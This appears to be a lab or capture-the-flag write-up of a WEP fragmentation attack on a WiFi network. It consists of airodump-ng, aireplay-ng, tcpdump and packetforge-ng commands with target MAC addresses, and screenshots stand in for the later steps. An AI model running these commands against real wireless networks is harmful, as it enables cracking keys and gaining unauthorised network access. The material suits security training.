# [Fragmentation Attack](Fragmentation%20Attack.md)
### Perform the Fragmentation attack on the WiFi network. What is the WEP KEY for this network? (Format: XX:XX:XX:XX:XX)

```sh
airodump-ng -c 1 -w WEP wlan0mon
```

![](Screenshot%202026-09-21%20at%2015.04.52.png)

```sh
aireplay-ng -5 -b D8:D6:3D:EB:29:D5 -h D2:D5:FE:F9:ED:39 wlan0mon
```

![](Screenshot%202026-09-21%20at%2015.06.56.png)

```sh
tcpdump -s 0 -n -e -r replay_src-0921-080635.cap 
reading from file replay_src-0921-080635.cap, link-type IEEE802_11 (802.11), snapshot length 65535
08:06:35.726627 BSSID:d8:d6:3d:eb:29:d5 SA:d2:d5:fe:f9:ed:39 DA:d8:d6:3d:eb:29:d5 Data IV:f33c30 Pad 0 KeyID 0
```

```sh
packetforge-ng -0 -a D8:D6:3D:EB:29:D5 -h 96:1B:67:DA:48:5F -k 192.168.1.1 -l 192.168.1.100 -y fragment-0921-081954.xor -w forgedarp.cap
```

![](Screenshot%202026-09-21%20at%2015.21.59.png)

![](Screenshot%202026-09-21%20at%2015.27.59.png)

![](Screenshot%202026-09-21%20at%2015.28.09.png)

![](Screenshot%202026-09-21%20at%2015.28.16.png)